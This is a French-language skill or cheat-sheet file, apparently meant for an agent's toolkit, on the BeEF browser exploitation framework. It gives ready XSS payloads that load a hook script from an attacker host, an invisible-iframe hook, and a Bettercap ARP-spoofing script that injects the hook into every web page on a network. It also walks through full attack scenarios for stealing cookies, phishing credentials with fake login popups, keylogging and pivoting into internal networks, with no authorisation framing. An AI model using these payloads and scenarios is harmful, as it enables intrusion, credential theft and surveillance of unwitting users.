---
name: beef
description: BeEF (Browser Exploitation Framework) — hook navigateur, modules d'exploitation, reconnaissance client, phishing, tunneling, exfiltration, pivoting via navigateur, et scénarios d'attaque complets.
---

# BeEF — Browser Exploitation Framework

## Présentation

BeEF (Browser Exploitation Framework) permet de prendre le contrôle d'un navigateur via un script JavaScript (hook) pour effectuer des attaques côté client.

**Concept :** Un utilisateur visite une page contenant le hook → le navigateur devient une "zombie" contrôlée depuis l'interface BeEF.

**Installation :**
```bash
# Kali
sudo apt install beef-xss

# Depuis GitHub
git clone https://github.com/beefproject/beef.git
cd beef
./install
./beef
```

**Lancement :**
```bash
cd /usr/share/beef-xss/
sudo ./beef

# ou
cd beef && sudo ruby beef

# Interface web : http://127.0.0.1:3000/ui/panel
# Login : beef / beef (configurable dans config.yaml)
```

---

## Configuration

### Fichier de configuration (`config.yaml`)
```yaml
# /usr/share/beef-xss/config.yaml (ou ./beef/config.yaml)

beef:
    version: '0.5.0.0'
    # Credentials
    credentials:
        user:   "beef"
        passwd: "beef"
    
    # Interface d'écoute
    http:
        host: "0.0.0.0"
        port: "3000"
        # HTTPS
        https:
            enable: true
            key: "/etc/beef-xss/beef.key"
            cert: "/etc/beef-xss/beef.crt"
    
    # Hook JavaScript
    hook_file: "/hook.js"
    hook_session_name: "BEEFHOOK"
    
    # Limites
    database:
        name: "beef.db"  # SQLite
    restrictions:
        permitted_hooking_subnet: "0.0.0.0/0"
        permitted_ui_subnet: "0.0.0.0/0"
```

### Changer le port du hook
```yaml
beef:
    http:
        port: 8080  # Éviter la détection sur port 3000
        web_ui_port: 3000  # UI panel sur port différent
```

---

## Le Hook (JavaScript)

### Hook de base
```html
<!-- Simple — page HTML classique -->
<script src="http://192.168.1.50:3000/hook.js"></script>

<!-- Sans DOMContentLoaded (attente de chargement) -->
<script>
    window.onload = function() {
        var s = document.createElement('script');
        s.src = 'http://192.168.1.50:3000/hook.js';
        document.body.appendChild(s);
    };
</script>

<!-- Via XSS (reflected) -->
http://cible.com/search?q=<script src="http://192.168.1.50:3000/hook.js"></script>

<!-- Via XSS (stored) -->
<script src="//192.168.1.50:3000/hook.js"></script>
```

### Hook furtif — IFRAME invisible
```html
<iframe src="http://192.168.1.50:3000/demos/butcher/index.html" 
        style="display:none;width:0;height:0;" frameborder="0"></iframe>
```

### Hook via img tag (XSS classique)
```html
<img src="x" onerror="var s=document.createElement('script');s.src='http://192.168.1.50:3000/hook.js';document.body.appendChild(s)">
```

### Hook auto-exécutant (via injection)
```javascript
// Injecter dans une page vulnérable
fetch('http://192.168.1.50:3000/hook.js').then(r=>r.text()).then(t=>eval(t))
```

---

## Interface — Command Center

### Onglets principaux
```bash
# Online Browsers — Navigateurs zombies connectés
#   - IP, Browser, OS, Plugins, Page courante
#   - Cookies, Screen, User-Agent

# Offline Browsers — Navigateurs déconnectés
# Logs — Activité des zombies
# XSSRays — Crawler XSS (découvrir d'autres XSS)

# Current Browser — Détails du navigateur sélectionné
#   - Onglets : Details, Logs, Commands, XSSRays, Event Log

# Commands — Modules d'exploitation
#   - Organisés par couleur :
#     Vert   = Fonctionne de manière fiable
#     Orange = Fonctionne mais peut être détecté
#     Rouge  = Ne fonctionne pas sur ce navigateur
#     Gris   = Non testé sur ce navigateur
```

---

## Commandes (modules) par catégorie

### 1. Reconnaissance du navigateur (Browser)
```bash
# === VERTS (fiables) ===
# Get Cookie
#   → Récupérer les cookies de session
Get Cookie

# Get Page HTML
#   → Télécharger le HTML de la page courante
Get Page HTML

# Get Page URL
#   → URL complète
Get Page URL

# Get System Info
#   → OS, version, language
Get System Info

# Get Platform
#   → Navigateur + plugins + versions
Get Platform

# Get Screen Size
#   → Taille d'écran (fingerprinting)
Get Screen Size

# Get Tabs
#   → Onglets ouverts
Get Tabs

# Detect AdBlock
#   → L'utilisateur utilise-t-il AdBlock ?
Detect AdBlock

# Detect Firebug
Detect Firebug

# Detect Ghostery
Detect Ghostery
```

### 2. Exploitation (Exploit)
```bash
# === ORANGE (risque de détection) ===
# Fake Flash Update
#   → Popup "Flash Player needs update" → télécharge maliciel

# Fake Notification Bar
#   → Barre de notification Chrome

# Java Plugin
#   → Tenter des exploits Java (si plugin installé)

# Man-In-The-Browser
#   → Modifier les pages en temps réel (transparent)
```

### 3. Réseau (Network)
```bash
# === ORANGE / VERT ===
# Detect Open Ports
#   → Scanner les ports locaux du navigateur
Detect Open Ports
#   Ports : 22, 80, 443, 445, 3306, 8080...

# Ping Sweep (WebRTC)
#   → Découvrir les hôtes du réseau local
Ping Sweep

# Port Scanner (WebRTC / Java)
#   → Scan de ports via WebRTC
Port Scanner

# Get Internal IP (WebRTC)
#   → Révéler l'IP locale (derrière le NAT)
Get Internal IP

# Get Hostname
#   → Nom de la machine
Get Hostname

# DNS Enumeration
#   → Forcer des requêtes DNS
```

### 4. Social Engineering
```bash
# === ROUGE (intrusif, détectable) ===
# Facebook Fake Like
#   → Popup "Cliquez Like" → récupère les infos Facebook

# Google Phishing
#   → IFRAME + fausse page de connexion Google

# Clippy
#   → Affiche Clippy (assistant Office) pour attirer l'attention

# Notification Bar
#   → Barre de notification dans le navigateur

# Pretty Theft
#   → Fausse popup de connexion (Facebook, Gmail, Twitter)
#   → Capture les credentials
Pretty Theft - Facebook
Pretty Theft - Google
Pretty Theft - Twitter

# Tab Napping
#   → Change le contenu de l'onglet quand il perd le focus
#   → Affiche une fausse page de login au retour
```

### 5. Persistance
```bash
# === VERT ===
# Confirm Close
#   → Demander confirmation avant de fermer (reste connecté)

# Create IFrame
#   → Créer une IFRAME qui recharge le hook
Create IFrame

# Popup Window
#   → Garder le hook dans une popup même si l'onglet est fermé

# Redirect
#   → Rediriger le navigateur vers une URL
```

### 6. Exfiltration
```bash
# === VERT / ORANGE ===
# Get Form Contents
#   → Récupérer le contenu de tous les formulaires
Get Form Contents

# Get Cookie SANS session
#   → Cookies sans HttpOnly
Get Cookie SANS session

# Get Page HREF Links
#   → Tous les liens de la page
Get Page HREF Links

# Get Referer
Get Referer

# Key Logger
#   → Enregistrer les frappes clavier
Key Logger

# Steal Browser History
#   → Historique de navigation (via CSS)
Steal Browser History

# ClipBoard
#   → Lire le presse-papier (si accessible)
```

### 7. Pivoting (Tunneling)
```bash
# === VERT / ORANGE ===
# Bind Shell (WebSocket)
#   → Shell basique via le navigateur (requiert réseau sortant)
Bind Shell

# Reverse Shell (WebSocket)
#   → Reverse shell vers l'attaquant
Reverse Shell

# Tunneling Proxy
#   → Proxy HTTP pour le réseau local de la victime
#   → Accéder aux machines internes depuis le navigateur
Tunneling Proxy

# HTTP Reverse Proxy
#   → Proxy inverse via le navigateur
```

### 8. iFrame / DOM manipulation
```bash
# === VERT ===
# Create iFrame
#   → Injecter une IFRAME invisible sur la page

# Hijack Page Links
#   → Modifier tous les liens pour pointer ailleurs

# Inject Tag
#   → Injecter des balises HTML dans la page

# Replace Page URL
#   → Changer l'URL affichée (URL bar)
```

---

## XSSRays — Crawler XSS automatique

```bash
# XSSRays explore la page courante pour trouver d'autres XSS
# 1. Aller dans l'onglet XSSRays
# 2. Cliquer sur "Scan"
# 3. BeEF explore les formulaires et liens
# 4. Chaque XSS trouvé peut être utilisé pour hook d'autres navigateurs
```

---

## Tunneling / Pivoting

### Proxy via navigateur
```bash
# 1. Clic droit sur le zombie → Use as Proxy
# 2. Configurer le navigateur avec le proxy BeEF
#    Firefox : 127.0.0.1:8080 (SOCKS)
#    Burp : utiliser l'extension BeEF

# 3. Accéder aux machines du réseau local de la victime
#    → Naviguer vers 192.168.1.100 (réseau interne)
```

### Reverse HTTP tunnel
```bash
# 1. Sur le zombie : module "Reverse HTTP Tunnel"
# 2. Sur l'attaquant :
curl http://127.0.0.1:8080/tunnel?host=192.168.1.1&port=80
# → Le trafic transite par le navigateur zombie
```

---

## Auto-hook — Injection automatique

### Avec BeEF + MITM (Bettercap)
```bash
# Combiner BeEF + Bettercap pour auto-hook tous les navigateurs
# 1. Lancer BeEF
sudo beef

# 2. Lancer Bettercap
sudo bettercap -I eth0
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof.on
> set http.proxy.script /tmp/beef_inject.js
> http.proxy.on

# Script d'injection Beef (beef_inject.js)
cat > /tmp/beef_inject.js << 'EOF'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') === 0) {
        var body = res.ReadBody();
        var hook = '<script src="http://192.168.1.50:3000/hook.js"></script>';
        body = body.replace('</head>', hook + '</head>');
        res.SetBody(body);
    }
}
EOF
```

### Avec BeEF + Responder
```bash
# Combiner avec Responder pour voler les hash NetNTLM
# Et hook via un serveur HTTP malveillant
sudo responder -I eth0 -wF
# Puis utiliser BeEF sur les pages servies
```

---

## Scénarios complets

### 1. Stored XSS → BeEF Hook
```bash
# Trouver un champ XSS stocké (forum, commentaires, profile)
# Injecter le hook :
<script src="http://192.168.1.50:3000/hook.js"></script>

# Chaque visiteur de la page devient automatiquement un zombie
# BeEF les liste dans "Online Browsers"
```

### 2. Phishing + Keylogger
```bash
# 1. Hooks le navigateur
# 2. Module : Pretty Theft → Facebook (popup fake login)
# 3. Simult : Key Logger (sur la page)
# 4. Attendre la victime entre ses identifiants
```

### 3. Réseau interne depuis l'extérieur
```bash
# 1. Hook via XSS sur un site public
# 2. Zombie = employé d'entreprise
# 3. Modules réseau :
#    Get Internal IP → IP locale
#    Ping Sweep → Machines visibles
#    Port Scanner → Services accessibles
# 4. Tunneling proxy → accès au réseau interne
```

### 4. Métasploit + BeEF
```bash
# BeEF et Metasploit intégration :
# 1. Dans BeEF, utiliser un module qui lance Metasploit
# 2. OU utiliser l'API REST de BeEF depuis msfconsole
curl -X POST http://127.0.0.1:3000/api/session/login \
    -d '{"username":"beef","password":"beef"}'

# Lister les zombies
curl -X GET http://127.0.0.1:3000/api/hooks
```

### 5. Auto-hook via MITM + Injection
```bash
# 1. ARP spoofing sur tout le réseau
# 2. Injection automatique du script hook dans chaque page HTTP
# 3. Tous les internautes du réseau deviennent des zombies BeEF
# 4. Voler les cookies, credentials, etc.
```

---

## API REST BeEF

```bash
# Login
curl -X POST http://127.0.0.1:3000/api/session/login \
    -d '{"username":"beef","password":"beef"}' \
    -c /tmp/beef_cookies.txt

# Récupérer le token
TOKEN=$(curl -c /tmp/beef_cookies.txt -X POST http://127.0.0.1:3000/api/session/login \
    -d '{"username":"beef","password":"beef"}' | jq -r '.token')

# Lister les zombies
curl -b /tmp/beef_cookies.txt \
    "http://127.0.0.1:3000/api/hooks?token=$TOKEN" | jq .

# Exécuter une commande sur un zombie
curl -b /tmp/beef_cookies.txt \
    -X POST \
    "http://127.0.0.1:3000/api/modules/COMMAND_ID/ACTION?token=$TOKEN" \
    -d '{"target_id":"ZOMBIE_ID","options":{}}'

# Options :
# COMMAND_ID = ID du module (ex: 14 = Get Cookie)
# ZOMBIE_ID = ID du navigateur zombie
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| Hook ne se connecte pas | Vérifier CORS, pare-feu, port 3000 accessible |
| "No sessions" | Vérifier que le navigateur cible exécute bien le JS |
| Module rouge | Navigateur trop récent, module non compatible |
| HTTP Only cookies | Ne peuvent pas être récupérés par JS |
| CSP bloc | Content Security Policy empêche le script |

---

## Antisèche rapide

```bash
# Lancer BeEF
sudo beef

# Hook (dans la page cible)
<script src="http://192.168.1.50:3000/hook.js"></script>

# Interface : http://127.0.0.1:3000/ui/panel
# Login: beef / beef

# Modules importants
Get Cookie        → Voler les cookies
Key Logger        → Keylogging
Pretty Theft      → Phishing popup
Ping Sweep        → Scan réseau
Tunneling Proxy   → Pivoting
Get Internal IP   → IP locale
Detect Open Ports → Scan ports

# API REST
curl -X POST http://127.0.0.1:3000/api/session/login -d '{"username":"beef","password":"beef"}'
```